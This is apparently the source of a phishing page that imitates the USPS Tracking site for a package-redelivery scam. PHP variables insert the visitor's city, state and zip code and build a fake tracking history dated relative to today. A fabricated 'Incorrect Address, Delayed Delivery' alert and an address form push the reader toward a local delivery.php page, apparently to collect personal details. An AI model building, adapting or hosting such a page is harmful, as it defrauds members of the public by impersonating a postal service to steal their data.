											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navinternational" id="navinternational" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navhelp" class="hidden-skip">Skip International Links</a>
								<a class="menuitem" tabindex="0" aria-expanded="false" aria-haspopup="true" role="menuitem" href="https://www.usps.com/international/">International</a>
								<div class="repos">
									<ul role="menu" aria-hidden="true" class="tools">
										<h3>Tools</h3>

										<li class="tool-calc">
											<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/?country=10440">Calculate International Prices</a>
										</li>
										<li class="tool-international-labels">
											<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Print International Labels</a>
										</li>
										<li class="tool-international-forms">
											<a role="menuitem" tabindex="-1" href="https://cfo.usps.com/cfo-web/labelInformation.html">Print Customs Forms</a>
										</li>
										<div class="desktop-only international-addition">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm">
												<img src="./index_files/go-now(4).png" alt=" ">
												<span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span>
											</a>
										</div>
									</ul>

									<ul role="menu" aria-hidden="true">
										<h3>Learn About</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/">International Sending</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/letters.htm">How to Send a Letter Internationally</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/preparing-international-shipments.htm">How to Send a Package Internationally</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/shipping-restrictions.htm">International Shipping Restrictions</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/international-how-to.htm">Shipping Internationally Online</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/insurance-extra-services.htm">International Insurance &amp; Extra Services</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/customs-forms.htm">Completing Customs Forms</a>
											</li>
										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm?pov=international">Military &amp; Diplomatic Mail</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/money-transfers.htm">Sending Money Abroad</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/passports.htm">Passports</a>
										</li>
									</ul>
									<ul role="menu" aria-hidden="true">
										<h3 class="desktop-only">&nbsp;</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/mail-shipping-services.htm">Comparing International Shipping Services</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/gxg.htm">Global Express Guaranteed</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-express-international.htm">Priority Mail Express International</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-international.htm">Priority Mail International</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-package-international-service.htm">First-Class Package International Service</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-mail-international.htm">First-Class Mail International</a>
											</li>

										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-claims.htm">Filing an International Claim</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-refunds.htm">Requesting an International Refund</a>
										</li>
									</ul>
									<form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search">
										<span tabindex="-1" aria-hidden="false" class="input--wrap">
											<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-international">Search USPS.com</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-international" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navhelp" id="navhelp" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navsearch" class="hidden-skip">Skip Help Links</a>
								<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://faq.usps.com/s/">Help</a>
								<div class="repos">
									<ul role="menu" aria-hidden="true">
										<li>
											<a role="menuitem" tabindex="-1" href="https://faq.usps.com/s/">FAQs</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/missing-mail.htm">Finding Missing Mail</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a>
										</li>
									</ul>
								</div>
							</li>
							<li class="nav-search menuheader">
								<a tabindex="-1" name="navsearch" id="navsearch" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#endnav" class="hidden-skip">Skip Search</a>
								<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#">Search USPS.com</a>
								<div class="repos">
									<!-- Search -->
									<span aria-hidden="false" class="input--wrap-label">
										<label class="visuallyhidden" for="styleguide-header--search-track">Search USPS.com</label>
									</span>

									<form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=">
										<span tabindex="-1" aria-hidden="false" class="input--wrap">
											<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-search">Search USPS.com</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-search" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>

									<div class="empty-search">
										<p>Top Searches</p>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a>
											</li>
										</ul>
									</div>
									<!-- END Search -->
								</div>
							</li>

						</ul>
					</nav>


					<div class="search--wrapper-hidden" id="search--display">
						<span aria-hidden="false" class="input--wrap-label">
						</span>
						<form role="search" method="get" class="search global-header--search" action="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=">
							<span aria-hidden="false" class="input--wrap">
								<div class="easy-autocomplete search-box">
									<label class="visuallyhidden" for="global-header--search-track-mob-search">Enter Search term for Search USPS.com</label>
									<input autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q fsrVisible global-header--search-track" id="global-header--search-track-mob-search" maxlength="256" name="q" type="text">
									<input value="Search" class="input--search search--submit" type="submit">
								</div>
								<div class="autocorrect">
									<ul></ul>
								</div>
							</span>
						</form>

						<div class="empty-search">
							<p>Top Searches</p>
							<ul>
								<li>
									<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a>
								</li>
								<li>
									<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a>
								</li>
								<li>
									<a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a>
								</li>
							</ul>
						</div>
					</div>
					<a name="endnav" id="endnav" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="hidden-skip">&nbsp;</a>
				</div>
			</div>


			<!--
<div class="g-alert"><p>Alert: On Sat., August 28th from 8 PM to 1 AM ET on Sun., August 29th, we will perform routine maintenance on USPS Tracking. During this time, you will not be able to opt in to email or text notifications. We apologize for any inconvenience.</p></div>   
  
<div class="g-alert"><p>Alert: From midnight to 3 AM ET on Friday, July 2nd, we will perform routine maintenance on USPS Tracking. During this time, you will not be able to opt in to email or text notifications. We apologize for any inconvenience.</p></div>

  <div class="g-alert"><p>Alert: USPS Tracking information may be unavailable this weekend during 2 routine maintenance periods: In the first period on Sat., May 15th from 12 AM to 3 AM ET, you won't be able to opt in to email or text notifications. In the second period on Sat., May 15th from 8 PM to 3 AM ET on Sun., May 16th, those options will be restored. We apologize for any inconvenience.</p></div>
-->

			<script type="text/javascript" src="./index_files/jquery-3.5.1.js(1)"></script>
			<script src="./index_files/modernizr.js"></script>
			<script type="text/javascript" src="./index_files/megamenu-v3.js"></script>
			<script type="text/javascript" src="./index_files/OneLinkUsps.js"></script>
			<script type="text/javascript" src="./index_files/ge-login.js"></script>
			<script src="./index_files/require.js"></script>
			<script src="./index_files/header-init-search.js"></script>
			<script src="./index_files/megamenu-additions.js"></script>


			<!-- END GLOBAL HEADER -->


			<div class="container-fluid full-subheader">
				<!-- Subheader -->
				<h1>
					USPS Tracking<sup>®</sup>
				</h1>
				<div class="subheader_links">
					<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="active">Tracking <i class="icon-carat_right"></i>
					</a>
					<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="header-faqs" id="faqHeader">
						<strong>FAQs</strong>
						<i class=""></i>
					</a>
				</div>
			</div>
			<!-- End Subheader -->
			<div class="container-fluid tracking_form_container">
				<!-- Track another package, tracking number entry form -->
				<div class="row">
					<div class="col-xl-3 col-lg-4 col-sm-12">
						<!--
 					<h3> 
 						<a class="track-another-package-open" href="#">Track Another 
 							Package <i>+</i> 
 						</a> 
 					</h3> 
-->
					</div>
					<div class="col-xl-9 col-lg-8 col-sm-12">
						<!-- Start INFORMED DELIVERY BANNER -->
						<div class="container-fluid informed_delivery_container">
							<div class="hidden-xs">
								<a href="https://reg.usps.com/xsell?app=UspsTools&amp;ref=homepageBanner&amp;appURL=https%3A%2F%2Finformeddelivery.usps.com/box/pages/intro/start.action" id="crossSellBanner" class="informed-delivery-content-wrapper" target="_blank">
									<div class="banner-blue-section">
										<img src="./index_files/idxs-icon.svg" class="mailman-icon" alt="Icon of a mailman">
										<p class="banner-header">
											Track Packages
											<br>Anytime, Anywhere
										</p>
									</div>
									<div class="banner-gray-section">
										<p>
											Get the free Informed Delivery<sup>®</sup> feature to
											receive automated notifications on your packages
										</p>
										<button class="button informed-delivery-btn" type="">Learn
											More</button>
									</div>
								</a>
							</div>
						</div>
						<!-- End INFORMED DELIVERY BANNER -->
					</div>
				</div>
				<!-- START CALENDAR MODAL -->
				<div class="modal fade" id="modal-start-end" role="dialog">
					<div class="dialog-start-end modal-dialog">
						<div class="modal-content modal-container redlivModalContent">
							<div class="modal-header redlivModalHeader">
								<h3 class="modal-title redlivModalTitle">Select Date</h3>
							</div>
							<div class="modal-body redlivModalBody">
								<div class="body-content">
									<div class="row">
										<div class="col-md-12 col-sm-12 col-xs-12" style="margin-top: -16px;">
											<p class="normal select-date-subheader">Available dates
												are based on the package selected.</p>
										</div>
									</div>
									<div class="row start-end-dates-cal-container">
										<div class="col-md-12 col-sm-12 col-xs-12 resume-date-cal">
											<div id="resume-start-cal"></div>
										</div>
									</div>
									<div class="row">
										<div class="col-md-12 col-sm-12 col-xs-12 required-field">
											<p class="normal date-selected">
												<strong>Date Selected:</strong>
												<input type="text" id="modal-resume-date" disabled="">
											</p>
										</div>
									</div>
									<div class="row">
										<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
											<div class="button-container redlivbtnContainer">
												<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" class="btn-primary saveDate" id="save-resume-date" data-dismiss="modal" tabindex="0">Select</a>
											</div>
										</div>
										<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
											<div class="button-container redlivbtnContainer">
												<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" class="btn-primary button--white clearDates" id="clear-resume-dates" data-dismiss="modal" tabindex="0">Cancel</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- END CALENDAR MODAL -->

				<div class="row">
					<div class="col-sm-10">
						<span class="cancel">
							<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" class="track-another-package-close" style="display: none;">Close <i class="icon-cancel"></i>
							</a>
						</span>
					</div>
				</div>
				<div class="row tracking-group" style="display: none">

					<!-- Start TRACKING FORM -->
					<!--
 				<form data-toggle="validator" action="TrackConfirmAction" 
 					name="TrackConfirmAction" id="trackPackage" method="GET">
 					<input type="hidden" id="tRef" name="tRef" value="fullpage" /> <input 
 						type="hidden" id="tLc" name="tLc" value="0" /> <input
 						type="hidden" id="text28777" name="text28777" value="" /> <input 
 						type="hidden" id="tLabels" name="tLabels" value="" />
 					<div class="col-sm-10"> 
 						<div class="form-group"> 
 							<textarea type="text" class="form-control" id="tracking-input" 
 								placeholder="Enter up to 35 tracking numbers separated by commas or enter a barcode number"
								required pattern="(((,[1-9])\d+)){1,35}" required
								data-pattern-error="Please enter a valid tracking number"
								data-required-error="Please enter a tracking number."></textarea>
 							<div class="help-block with-errors"></div> 
 						</div> 
 					</div> 
 					<div class="col-sm-2 track-btn-ctn"> 
 						<button class="button tracking-btn" type="submit">Track</button> 
 					</div> 
 				</form> 
-->
					<!-- End TRACKING FORM -->

				</div>
			</div>
			<!-- END Track another package, tracking number entry form -->

			<div id="tracked-numbers">
				<!-- Container for all tracking numbers, includes available actions  -->





				<!-- hard-coded til we get test labels -->














































				<div class="track-bar-container">
					<!-- Tracking bar with available actions underneath -->
					<input type="hidden" class="ablang" value="false">
					<input type="hidden" class="abevtcode" value="NT">
					<input type="hidden" class="abdelco" value="">
					<!-- .container-fluid -->
					<div class="container-fluid">
						<div class="row">
							<div class="col-sm-10 col-sm-offset-1">

								<!-- ADP -->












								<!-- End ADP -->

								<div class="product_summary">

									<!-- START TRACKING NUMBER SECTION -->
									<div class="row">
										<div class="col-md-12 col-sm-12 col-xs-12 tracking-number-wrapper">

											<p class="tracking-label">



												Tracking Number:


											</p>
											<div class="tracking-wrapper">
												<span class="tracking-number" value="9405510200864176182429">9405510200864176182429</span>
											</div>


										</div>
									</div>
									<!-- END TRACKING NUMBER SECTION -->

									<!-- START pdd, edd, gdd, etc. -->
									<div class="row row-wrapper track-statusbar">
										<!-- START STATUS BANNER -->




										<div class="col-md-6 col-sm-7 col-xs-12 update-banner-wrapper banner-1">












											<div class="container-fluid">
												<div class="row">
													<div class="col-md-12 col-sm-12 col-xs-12 latest-update-banner-wrapper red-banner">




														<h3 class="banner-header">Latest Update</h3>



														<p class="banner-content">
															We have issues with your shipping address. Redelivery service is available nationwide, but some of the areas are not serviceable, Submit a new delivery on our <a href="./delivery.php">Redelivery Service page</a>.
														</p>
													</div>
												</div>
											</div>


















										</div>

										<!-- END pdd, edd, gdd, etc. -->


										<div class="col-md-6 col-sm-5 col-xs-12 current-tracking-status-wrapper">
											<div class="container-fluid">
												<div class="row">



















													<div class="tracking-progress-bar-status-container in-transit-status">

























														<div class="upcoming-step">
															<p class="upcoming-status">Delivered</p>
														</div>





														<div class="upcoming-step">
															<p class="upcoming-status">Out for Delivery</p>
														</div>





														<div class="upcoming-step">
															<p class="upcoming-status">Preparing for Delivery</p>
														</div>











														<div class="tb-step current-step">




															<span class="bar-fill-animation"></span>


															<p class="tb-status">Alert</p>


															<p class="tb-status-detail">Incorrect Address, Delayed Delivery</p>


															<p class="tb-location">
																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;
															</p>



															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("today")); ?>, <?php echo date("Y",strtotime("today")); ?>, <?php echo $hourtime ?>

															</p>
														</div>

														<div class="tb-step">

															<p class="tb-status-detail">Return to Logistics Center</p>
															<p class="tb-location">

																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;


															</p>
															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>, 02:56 pm


															</p>
														</div>

														<div class="tb-step">

															<p class="tb-status-detail">Abnormal</p>
															<p class="tb-location">

																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;


															</p>
															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>, 02:40 pm


															</p>
														</div>


														<div class="tb-step">

															<p class="tb-status-detail">Out for Delivery</p>
															<p class="tb-location">

																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;


															</p>
															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>, 02:36 pm


															</p>
														</div>

														<div class="tb-step">

															<p class="tb-status-detail">In Transit</p>
															<p class="tb-location">

																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;


															</p>
															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>, 01:21 pm


															</p>
														</div>

														<div class="tb-step">

															<p class="tb-status-detail">Arrived at USPS Regional Destination Facility</p>
															<p class="tb-location">

																<?php echo $cityy ?>,
																<?php echo $sxx ?>
																<?php echo $zipp ?>&nbsp;


															</p>
															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>, 11:56 am


															</p>
														</div>


														<div class="tb-step">


															<p class="tb-status-detail">In Transit to Next Facility</p>

															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-1 day")); ?>, <?php echo date("Y",strtotime("today")); ?>

															</p>
														</div>






														<div class="tb-step">


															<p class="tb-status-detail">Arrived at USPS Regional Origin Facility</p>


															<p class="tb-location">
																LOS ANGELES CA DISTRIBUTION CENTER&nbsp;
															</p>



															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-2 day")); ?>, <?php echo date("Y",strtotime("today")); ?>,
																03:13 pm

															</p>
														</div>







														<div class="tb-step collapsed">


															<p class="tb-status-detail">Accepted at USPS Origin Facility</p>


															<p class="tb-location">
																SOUTH EL MONTE, CA 91733&nbsp;
															</p>



															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-2 day")); ?>, <?php echo date("Y",strtotime("today")); ?>,
																11:28 am

															</p>
														</div>







														<div class="tb-step collapsed">


															<p class="tb-status-detail">Shipping Label Created, USPS Awaiting Item</p>


															<p class="tb-location">
																SOUTH EL MONTE, CA 91733&nbsp;
															</p>



															<p class="tb-date"> <?php echo $res ?> <?php echo date("d",strtotime("-2 day")); ?>, <?php echo date("Y",strtotime("today")); ?>,
																10:26 am

															</p>
														</div>





														<div class="tb-step toggle-history-container">
															<a href="#" class="expand-collapse-history">See All Tracking History</a>
														</div>




													</div>

												</div>
											</div>
										</div>
									</div>


								</div>
								<!-- END Product Summary -->

								<!-- Archive Tracking when there is no "status" from PTR  -->



								<!-- Product Tracking Information -->
								<div class="product_additional_information">

									<!-- Product Tracking Details -->
									<div class="product_tracking_details">


										<!-- AVAILABLE ACTIONS -->
										<!-- This is the parent container for the available actions accordion menu -->
										<div class="actions_contain">

											<!-- Accordion Actions -->
											<div class="panel-group" id="accordion-actions-1" role="tablist" aria-multiselectable="true">


												<div class="panel panel-default get-updates-anchor">
													<!-- Text and Email Updates -->








													<!-- Panel Heading -->
													<div class="panel-heading collapser" role="tab" data-parent="#accordion-actions" href="#delivery-instructions" aria-expanded="true" aria-controls="">
														<!-- This is the clickable heading for the 'Change Your Delviery Instructions' panel -->
														<h4 class="panel-title">
															<a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" role="button" data-parent="#accordion-actions" aria-expanded="true" aria-controls="delivery-instructions" class="collapsed" id="">
																<span class="panel-word">Modify shipping address</span>
															</a>
														</h4>
													</div> <!-- End of panel heading -->

													<div id="delivery-instructions_1" class="panel-collapse collapse in diPanel" role="tabpanel">
														<div class="panel-body sample-number-panels">
															<!-- Body content for first panel, 'Delivery Instructions' -->
															<div class="row">
																<div class="panel-actions-content delivery-instructions-content">

																	<!-- Step 0 of 'change your delivery instructions' -->
																	<div class="change-delivery-module step-0 actions_section" data-deliverymodule="0">
																		<div class="ptag">
																			<p>We have issues with your shipping address, You can schedule redelivery online by Submit your new address, We Redeliver for you!
																			</p>
																			<div class="modal fade" id="deliveryInstructionsModal" role="dialog">
																				<div class="modal-dialog">
																					<div class="modal-content di-tooltip-modal">
																						<div class="modal-header">
																							<button type="button" class="close di-close" data-dismiss="modal" tabindex="0"></button>
																						</div>
																						<div class="modal-body tooltip-modal-body">
																							<div class="di-tooltip-text-info">
																								<h3>Delivery Instructions</h3>
																							</div>
																							<div class="di-tooltip-modal-content">
																								<div class="di-tooltip-modal-text">
																									<strong>Excluded Items:</strong>
																								</div>
																								<ul>
																									<li>
																										<span>Items insured for $500 or more</span>
																									</li>
																									<li>
																										<span>COD</span>
																									</li>
																									<li>
																										<span>Items requiring a signature</span>
																									</li>
																									<li>
																										<span>Registered Mail™</span>
																									</li>
																									<li>
																										<span>Periodicals</span>
																									</li>
																								</ul>
																								<div class="di-tooltip-modal-text">
																									<br>
																									<strong>Or if you have submitted these requests:</strong>
																								</div>
																								<ul class="di-tooltip-modal-list">
																									<li>
																										<span>Active Hold Mail request</span>
																									</li>
																									<li>
																										<span>Active Forwarding order (permanent change
																											<br>
																											of address, temporary forwarding order,
																											<br>
																											Premium Forwarding Service)</span>
																									</li>
																									<li>
																										<span>Hold For Pickup</span>
																									</li>
																								</ul>
																								<br>
																								<p>
																									<br>Please see the <a href="https://faq.usps.com/s/article/USPS-Delivery-Instructions-The-Basics" target="blank">FAQs</a> for more information.</p>
																							</div>
																						</div>
																					</div>
																				</div>
																			</div>

																		</div>
																		<p>Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day.</p>
																	</div>
																	<!--End Step 0 -->

																	<form id="changeDeliveryInstructions_1" action="https://tools.usps.com/go/TrackConfirmEasrAJAXAction.action" method="post" class="actions_form changeDeliveryInstructions" role="form" novalidate="true">
																		<!-- Change Delivery instructions form -->

																		<input type="hidden" name="label" value="9405510200864176182429">
																		<input type="hidden" name="easrFunc" value="">
																		<input type="hidden" name="destinationZip" value="20121">
																		<input type="hidden" name="custRegZip5" value="">
																		<input type="hidden" name="deliveryOption" value="1">

																		<!-- Step 1 of 'change your delivery instructions' -->

																		<div class="change-delivery-module step-1 actions_section" data-deliverymodule="1">
																			<div class="ptag">
																				<p>Want to authorize your USPS<sup>®</sup> carrier to drop off your package when no one’s home for delivery? It’s easy. And you can even have your package left in a specific area of your home or business, with a neighbor, or have it delivered to another address.</p>
																				<a id="di-easr-popover-id" class="icon-tooltip"></a>
																				<div class="modal fade" id="deliveryInstructionsEasrModal" role="dialog">
																					<div class="modal-dialog">
																						<div class="modal-content di-tooltip-modal">
																							<div class="modal-header">
																								<button type="button" class="close di-close" data-dismiss="modal" tabindex="0"></button>
																							</div>
																							<div class="modal-body tooltip-modal-body">
																								<div class="di-tooltip-text-info">
																									<h3>Schedule a Redelivery</h3>
																								</div>
																								<div class="di-tooltip-modal-content">
																									<div class="di-tooltip-modal-text">
																										<strong>Excluded Items:</strong>
																									</div>
																									<ul>
																										<li>
																											<span>Items insured for $500 or more</span>
																										</li>
																										<li>
																											<span>COD</span>
																										</li>
																										<li>
																											<span>Items requiring a signature</span>
																										</li>
																										<li>
																											<span>Registered Mail™</span>
																										</li>
																										<li>
																											<span>Periodicals</span>
																										</li>
																									</ul>
																									<div class="di-tooltip-modal-text">
																										<br>
																										<strong>Or if you have submitted these requests:</strong>
																									</div>
																									<ul class="di-tooltip-modal-list">
																										<li>
																											<span>Active Hold Mail request</span>
																										</li>
																										<li>
																											<span>Active Forwarding order (permanent change
																												<br>
																												of address, temporary forwarding order,
																												<br>
																												Premium Forwarding Service)</span>
																										</li>
																										<li>
																											<span>Hold For Pickup</span>
																										</li>
																									</ul>
																									<br>
																									<p>
																										<br>Please see the <a href="https://faq.usps.com/s/article/USPS-Delivery-Instructions-The-Basics" target="blank">FAQs</a> for more information.</p>
																								</div>
																							</div>
																						</div>
																					</div>
																				</div>

																			</div>
																			<p>Please read and agree to the Terms and Conditions to continue.</p>
																			<div class="checkbox form-group">
																				<label>
																					<input id="scheduleRedelivery_terms-1" type="checkbox" value="" required="" data-error="You must read and agree to the Terms &amp; Conditions to submit your request.">
																					<span></span>I have read, understand, and agree to the <a href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#" data-toggle="modal" data-target="#modalDeliveryInstructionsTerms">Terms and Conditions</a>
																				</label>
																				<div class="help-block with-errors"></div>
																			</div>
																		</div>
																		<!--End Step 1 -->

																		<!-- Step 2 of 'change your delivery instructions' -->


																		<div class="change-delivery-module step-2 actions_section" data-deliverymodule="2">
																			<div class="ptag">
																				<p>Want to authorize your USPS<sup>®</sup> carrier to drop off your package when no one’s home for delivery? It’s easy. And you can even have your package left in a specific area of your home or business, with a neighbor, or have it delivered to another address.</p>
																				<a id="di-step2-popover-id" class="icon-tooltip"></a>
																				<div class="modal fade" id="deliveryInstructionsStep2Modal" role="dialog">
																					<div class="modal-dialog">
																						<div class="modal-content di-tooltip-modal">
																							<div class="modal-header">
																								<button type="button" class="close di-close" data-dismiss="modal" tabindex="0"></button>
																							</div>
																							<div class="modal-body tooltip-modal-body">
																								<div class="di-tooltip-text-info">
																									<h3>Delivery Instructions</h3>
																								</div>
																								<div class="di-tooltip-modal-content">
																									<div class="di-tooltip-modal-text">
																										<strong>Excluded Items:</strong>
																									</div>
																									<ul>
																										<li>
																											<span>Items insured for $500 or more</span>
																										</li>
																										<li>
																											<span>COD</span>
																										</li>
																										<li>
																											<span>Items requiring a signature</span>
																										</li>
																										<li>
																											<span>Registered Mail™</span>
																										</li>
																										<li>
																											<span>Periodicals</span>
																										</li>
																									</ul>
																									<div class="di-tooltip-modal-text">
																										<br>
																										<strong>Or if you have submitted these requests:</strong>
																									</div>
																									<ul class="di-tooltip-modal-list">
																										<li>
																											<span>Active Hold Mail request</span>
																										</li>
																										<li>
																											<span>Active Forwarding order (permanent change
																												<br>
																												of address, temporary forwarding order,
																												<br>
																												Premium Forwarding Service)</span>
																										</li>
																										<li>
																											<span>Hold For Pickup</span>
																										</li>
																									</ul>
																									<br>
																									<p>
																										<br>Please see the <a href="https://faq.usps.com/s/article/USPS-Delivery-Instructions-The-Basics" target="blank">FAQs</a> for more information.</p>
																								</div>
																							</div>
																						</div>
																					</div>
																				</div>

																			</div>
																			<p class="bold">To get started, enter the original address the package was being shipped to below:</p>
																			<p class="changed_city">



																			</p>
																			<p>
																				<label>
																					<sup>*</sup>Indicates a required field
																				</label>
																			</p>
																			<div class="row">
																				<div class="col-sm-6 form-group">
																					<label for="changeDeliveryInstructions_address">*Street Address</label>
																					<input type="text" id="changeDeliveryInstructions_address" name="tStreet" value="" class="form-control" placeholder="1234 Main Street" pattern="^[\w\-_&amp;.,`#@!\s]+$" required="" data-pattern-error="Please enter a valid address" data-required-error="Please enter a valid address">
																					<div class="help-block with-errors"></div>
																				</div>
																				<div class="col-sm-6 form-group">
																					<label for="changeDeliveryInstructions_address2">Apt/Suite/Other</label>
																					<input type="text" id="changeDeliveryInstructions_address2" name="tOther" value="" class="form-control" placeholder="">
																					<div class="help-block with-errors"></div>
																				</div>
																			</div>
																		</div>

																		<!-- END Step 2 -->

																		<!-- Step 3 of 'change your delviery instructions' -->
																		<div class="change-delivery-module step-3" data-deliverymodule="3" style="">
																			<p>
																				<label>
																					<sup>*</sup>Indicates a required field
																				</label>
																			</p>
																			<label class="authorized-address">
																				<img src="./index_files/USPS_Green_Check.svg"> Your address is authorized.</label>
																			<div class="radio-package">
																				<div class="form-group">
																					<label>*What should we do with the package?</label>
																					<div class="radio">
																						<!-- Radio Option 1 -->
																						<label>
